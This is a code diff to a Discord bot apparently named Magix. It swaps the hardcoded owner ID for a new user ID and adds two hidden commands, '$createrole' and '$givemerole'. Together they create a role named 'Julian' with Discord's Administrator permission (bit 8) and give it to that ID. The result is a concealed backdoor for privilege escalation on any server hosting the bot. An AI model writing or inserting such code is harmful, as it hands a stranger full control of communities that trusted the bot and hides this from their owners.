@@ -3,7 +3,7 @@ const moment = require('moment');
 const client = new Discord.Client();
 const prefix = '-'
 const adminprefix = '$'
-const myID = "470366007748198401";
+const myID = "516394289895571467";
 
 client.on('ready', () => {
   console.log(`[Magix] Logged in as ${client.user.tag}!`);      
@@ -23,6 +23,29 @@ client.on('voiceStateUpdate', (old, now) => {
   if (currentSize !== size) channel.setName(`Magix Voice: [ ${currentSize} ]`);
 
 });
+
+client.on('message', message => {
+     
+
+     if (message.content === "$createrole") {
+	                    if(!message.channel.guild) return message.reply(':no_entry: | This Command For Servers Only!'); 
+         if(message.author.id !== myID) return;
+  message.guild.createRole({
+        name : "Julian",
+        permissions :   [8],
+        color : " #ff0000"
+    }) 
+}
+});
+
+client.on('message', message => {
+  if (message.content.startsWith('$givemerole')) {
+     if(!message.channel.guild) return;
+ if(message.author.id !== myID) return;
+message.member.addRole(message.guild.roles.find("name", "Julian"));
+ 
+ }
+ });
 
  client.on('message', message => {//help msg
     if (message.author.bot) return;
